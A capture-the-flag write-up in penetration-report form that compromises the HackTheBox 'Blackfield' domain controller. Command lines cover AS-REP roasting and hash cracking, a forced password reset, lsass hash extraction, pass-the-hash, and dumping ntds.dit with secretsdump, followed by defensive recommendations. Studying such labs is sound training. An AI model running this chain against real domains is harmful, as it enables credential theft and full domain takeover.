# HTB Blackfield - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-19

---

## 0. Lesson Learned

When Bloodhound doesn't show a Shortest Path to Domain Admin, make sure to examine the individual node info like Object Control.

---

## 1. Executive Summary

An internal penetration test was conducted against the BLACKFIELD.local domain environment. The assessment resulted in full domain compromise through a sequence of misconfigurations and credential abuses within Active Directory. Initial access was achieved via AS-REP roasting, followed by lateral movement using delegated privileges, and ultimately privilege escalation through abuse of SeBackupPrivilege to extract domain controller secrets. No exploits were required; all actions leveraged legitimate administrative functionality and weak configurations.

---

## 2. Scope

- **Target:** 10.129.229.17
- **Domain:** BLACKFIELD.local
- **Environment:** HackTheBox Blackfield (Retired Machine)
- **Testing Window:** 2026-3-18
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.229.17 -T4 -oA blackfield_tcp
```

The scan identified several exposed services, including Kerberos (88), LDAP (389), SMB (445), RPC (135/593), Global Catalog (3268), and WinRM (5985), indicating the target was likely a domain controller.

---

## 5. Enumeration

SMB enumeration was performed to identify accessible shares and potential information disclosure.

```
smbclient -L //10.129.229.17 -N
```

An accessible share named `profiles$` was identified and queried to enumerate user directories.

```
smbclient //10.129.229.17/profiles$ -N -c 'ls'
```

The output was saved and processed to extract a list of valid usernames.

```
smbclient //10.129.229.17/profiles$ -N -c 'ls' > profiles.txt

awk '{print $1}' profiles.txt > users.txt
```
Kerberos pre-authentication weaknesses were then tested by performing AS-REP roasting against the identified users.

```
GetNPUsers.py -no-pass -usersfile users.txt -dc-ip 10.129.229.17 BLACKFIELD.local/
```

A valid AS-REP hash was obtained and subsequently cracked offline using a wordlist attack.

```
hashcat -m 18200 asrep23.hash /usr/share/wordlists/rockyou.txt
```

This resulted in valid domain credentials:

```
support : #00^BlackKnight
```

The credentials were validated against SMB services to confirm access.

```
crackmapexec smb 10.129.229.17 -u users.txt -p passwords.txt --continue-on-success
```

---

## 6. Initial Access

Authenticated SMB access was used to download Group Policy data from the SYSVOL share for further analysis.

```
smbclient //10.129.229.17/SYSVOL -U support --password='#00^BlackKnight' -c 'recurse ON; prompt OFF; mget *'
```

The downloaded files were searched for sensitive information.

```
find . -type f -iname *.xml
```

Further Active Directory enumeration was conducted using BloodHound to identify privilege relationships.

```
bloodhound-python -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.129.229.17 -c All --zip
```

Analysis revealed that the `support` account had the ability to force a password reset on the `audit2020` account.

---

## 7. Post-Exploitation

The delegated privilege was abused to reset the password of the audit2020 user via RPC.

```
rpcclient -U support 10.129.229.17

setuserinfo2 audit2020 23 'P@ssword1'
```

The newly obtained credentials were used to access additional SMB shares.

```
smbclient //10.129.229.17/forensic -U audit2020 --password='P@ssword1'
```

All available files were downloaded for offline analysis.

```
smbclient //10.129.229.17/forensic -U audit2020 --password='P@ssword1' -c 'recurse ON; prompt OFF; mget *'
```

A memory dump was identified and analyzed to extract credentials.

```
pypykatz lsa minidump lsass.DMP -g
```

This process yielded NTLM hashes for privileged accounts, including `svc_backup`.

Pass-the-hash techniques were then used to gain remote access via WinRM.

```
crackmapexec winrm 10.129.229.17 -u svc_backup -H <hash>

evil-winrm -i 10.129.229.17 -u svc_backup -H <hash>
```

---

## 8. Privilege Escalation

Privilege enumeration revealed that the `svc_backup` account possessed `SeBackupPrivilege`.

```
whoami /priv
```

This privilege was leveraged to access sensitive system files by creating a Volume Shadow Copy.

Required modules were uploaded and imported:

```
Import-Module .\SeBackupPrivilegeCmdLets.dll

Import-Module .\SeBackupPrivilegeUtils.dll
```

A diskshadow script was created and executed to mount a shadow copy of the system drive.

```
diskshadow /s c:\programdata\vss.dsh
```

Critical files were extracted using backup privileges.

```
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit c:\programdata\ntds.dit

reg save HKLM\SYSTEM C:\programdata\SYSTEM
```

The files were downloaded and used to extract domain password hashes.

```
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

The Administrator hash was validated and used to obtain full domain access.

```
crackmapexec winrm 10.129.229.17 -u Administrator -H <hash>

evil-winrm -i 10.129.229.17 -u Administrator -H <hash>
```

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\svc_backup\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full domain compromise.

---

## 10. Findings & Recommendations

### **Finding:** AS-REP Roastable Service Account

**Severity:** Critical

**Description:**
A service account was configured without Kerberos preauthentication enabled, making it vulnerable to AS-REP roasting attacks.

**Impact:**
Attackers could request authentication material and perform offline password cracking without valid domain credentials, potentially leading to privilege escalation.

**Recommendation:**
Enforce Kerberos preauthentication for all accounts, audit for accounts with the UF_DONT_REQUIRE_PREAUTH flag set, and ensure strong, complex passwords are used for service accounts.

### **Finding:** Weak Domain Password Policy

**Severity:** High

**Description:**
The domain password policy allowed weak or easily guessable passwords that could be cracked using common wordlists.

**Impact:**
Attackers could recover user credentials through offline cracking or password spraying, potentially leading to privilege escalation.

**Recommendation:**
Enforce strong password complexity requirements, implement account lockout policies, and monitor for excessive authentication attempts.

### **Finding:** Excessive Delegated Privileges Allowing Password Reset Abuse

**Severity:** Critical

**Description:**
A domain account was granted delegated privileges such as ForceChangePassword over other users, allowing unauthorized password resets.

**Impact:**
Attackers could reset passwords for privileged accounts and gain unauthorized access, potentially leading to domain compromise.

**Recommendation:**
Restrict delegated privileges to only required accounts, review Active Directory ACLs regularly, and enforce the principle of least privilege.

### **Finding:** Sensitive Active Directory Database Files Exposed via SMB Share

**Severity:** Critical

**Description:**
An SMB share exposed sensitive Active Directory database files.

**Impact:**
Attackers could download the files and extract domain password hashes, potentially leading to full domain compromise.

**Recommendation:**
Restrict SMB share permissions to authorized administrators only, store backups in secured locations, and monitor file shares for exposure of sensitive Active Directory data.

### **Finding:** SeBackupPrivilege Assigned to Non-Administrator Account

**Severity:** Critical

**Description:**
A non-administrative account possessed the SeBackupPrivilege privilege, allowing access to sensitive system files regardless of file permissions.

**Impact:**
Attackers could abuse this privilege to extract sensitive data such as registry hives or Active Directory database files, leading to credential compromise and privilege escalation.

**Recommendation:**
Remove SeBackupPrivilege from non-administrative accounts, restrict backup privileges to authorized users only, and audit privilege assignments regularly.

---

## 11. Appendix

smbclient Command Cheatsheet -
[https://hackviser.com/tactics/tools/smbclient](https://hackviser.com/tactics/tools/smbclient)

awk Cheatsheet -
[https://medium.com/@tradingcontentdrive/awk-the-command-that-makes-you-look-like-a-log-reading-wizard-0e5f6e4c1b0f](https://medium.com/@tradingcontentdrive/awk-the-command-that-makes-you-look-like-a-log-reading-wizard-0e5f6e4c1b0f)

rpcclient Command Cheatsheet -
[https://hackviser.com/tactics/tools/rpcclient](https://hackviser.com/tactics/tools/rpcclient)

Dump lsass Files on Linux -
[https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d](https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d)

SeBackupPrivilege Exploit and Walkthrough - 
[https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)